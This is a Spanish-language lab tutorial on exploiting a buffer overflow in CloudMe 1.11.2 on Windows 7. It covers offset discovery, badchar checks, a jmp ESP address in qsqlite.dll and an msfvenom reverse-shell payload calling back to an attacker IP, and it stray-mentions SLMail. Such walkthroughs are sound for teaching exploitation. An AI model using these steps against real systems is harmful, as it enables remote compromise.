# Buffer Overflow Cloudme 1.11.2

Tutorial de buffer overflow en Windows de 32 bits con el programa Cloudme 1.11.2. Se hace uso de maquinas virtuales, una máquina con Parrot OS (máquina atacante) y otra con Windows 7 (máquina víctima).

Para usar Cludme es necesario crearse una cuenta 

![cloudme](./img/cloudme_reg.png)

Con Immunity Debugger y con la utilidad mona vamos a determinar el offset y direcciones de memoria para ejecutar nuestro shell code. 

Cloudme usa el puerto 8888 pero no está a la vista desde la máquina atacante para poder conectarnos haremos uso de la herramienta Chisel, que nos permite compartir puertos internos de la máquina victima a la máquina atacante. Hay que descargar Chisel según la versión de OS.

Una vez descargado Chisel, desde la máquina atacante ejecutar ``` ./chisel server -p puerto --reverse ```

![chisel_linux](./img/chisel_linux.png)

Y desde la máquina víctima 
```chisel.exe client IPMaquinaAtacante:puerto R:8888:127.0.0.1:8888 ```

![chisel_windows](./img/chisel_windows.png)

Para comprobar que efectivamente se nos ha compartido el puerto con el comandos ```lsof -i:8888 ```

![check_port](./img/check_port.png)

Con netcat podemos conectarnos al servicio

![nc_send_data](./img/nc_send_data.png)

Al enviar datos se puede acontecer el Buffer Overflow para obtener el offset con pattern create crearemos un patrón que será enviado y con Immunity Debugger obtendremos la dirección de la memoría del EIP

```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 ```

![pattern_buffer](./img/pattern_buffer.png)

![pattern_buffer](./img/pattern_buffer_2.png)

En la máquina victima con Immunity Debugger (ejecutar como administrador) nos sincronizamos con Cloudme, se pausará el programa darle al botón de play para que se reanude el flujo del programa. Una vez sincronicados ejecutar el script.

![pattern_eip](./img/pattern_eip.png)

Con ``` pattern_offset -q dirección ``` se determina el offset con la dirección del EIP que se obtuvo en Immunity Debugger

![offset](./img/pattern_offset.png)

En este caso el offset es de 1052.

Comprobamos que sea el offset

![buffer_check](./img/buffer_check.png)

![eip_check](./img/eip_check.png)

Ahora se determina los badchars (carácteres que el programa no puede interpretar) con la utildad mona.py se facilita esta tarea. Para ello se debe copiar en ``` C:\Program Files\Immunity Inc\Immunity Debugger\Libs ```

Con el comando ``` !mona config -set workingfolder C:\Users\Usuario\Desktop\%p ``` se crea un directorio de trabajo 

![mona_folder](./img/mona_working_folder.png)

con ``` !mona bytearray ``` se generan dos archivo, uno de ellos bytearray.txt, que contiene los carácteres imprimibles.

![mona_bytearray](./img/mona_array.png)

Transferir el archivo bytearray.txt a la máquina atacante y añadir los carácteres en el script.

![badchards_script](./img/badchars.png)


Ejecutar el script y desde Immunity Debugger en el EIP se tiene una dirección, se ejecuta 
``` !mona compare -f C:\Users\Users\Desktop\Cloudme\bytearray.bin -a direccion ``` para obtener un badchar)

![badchars_esp](./img/badchars_esp.png)

![badchars_compare](./img/badchars_compare.png)
    
En este caso no hay badchars por lo que se puede generar directamente el shell code

``` 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.249.128 LPORT=443 -a x86 --platform windows -e x86/shikata_ga_nai -f c
```

![sheell_code](./img/shell_code.png)


Para que se logre interpretar el shell code se debe dar un salto al ESP, se busca la dirección a jmp ESP. Nasm_shell nos ayuda a obtener las direcciónes de instrucciones a bajo nivel en este caso la de jmp ESP.

```/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb```

![jmp_ESP](./img/jmp_esp.png)

Con ```!mona modules ``` se muestran los módulos de SLMail, se busca alguno que tenga Rebase, Safe, ASLR, NXCompat en "False". Se escoge qsqlite.dll

![mona_modules](./img/mona_modules.png)


Se busca la dirección de jmp ESP en el módulo con ```
!mona find -s "\xff\xe4" -m qsqlite.dll ``` y se comprueba la dirreción a jmp ESP

![find_jmp_addr](./img/find_jmp_esp.png)

![find_jmp](./img/esp_addr.png)

En el script de python se añade la dirección de jmp ESP pero al ser 32 bits se debe de estar en Little Endian. Para convertir a Little Endian se separa la dirección en pares y se inverte el orden ``` 6D619117 ->  1791616D ```

Y finalmente se añade NOPs ```\x90``` al payload y se ejecuta el script para obtener una reverse shell


![reverse_shell](./img/bof.png)



